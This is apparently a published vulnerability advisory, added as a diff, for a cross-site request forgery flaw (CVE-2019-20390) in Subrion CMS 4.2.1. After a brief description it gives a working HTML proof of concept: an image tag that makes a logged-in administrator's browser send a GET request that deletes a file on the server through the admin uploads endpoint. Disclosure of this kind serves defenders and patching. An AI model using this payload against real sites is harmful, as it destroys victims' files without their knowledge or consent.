@@ -1,0 +1,23 @@
+# Title: Subrion CMS 4.2.1 Cross-Site Request Forgery vulnerability (CSRF)
+# Date: 01-12-2019
+# Author: Christian Bortone
+# Contact: christianbortone@gmail.com
+# Vendor Homepage: https://subrion.org/
+# Vulnerable Product: Subrion CMS 4.2.1
+# CVE : CVE-2019-20390
+
+
+1. Description:
+
+A Cross-Site Request Forgery (CSRF) vulnerability is discovered in Subrion CMS 4.2.1 which allows a remote attacker to remove files on the server without victim's knowledge by enticing authenticated user to visit attacker page/URL. The application failed to validate CSRF token on the GET request. An attacker can craft an URL (removing the token) and send to the victim.  
+
+
+2. Proof of Concept
+
+<!-- Cancel file test.txt (l1_ci90ZXN0LnR4dA) from directory rm.  -->
+
+<html>
+
+<img src="http://localhost/subrion/panel/uploads/read.json?cmd=rm&targets[]=l1_ci90ZXN0LnR4dA" />
+
+</html>
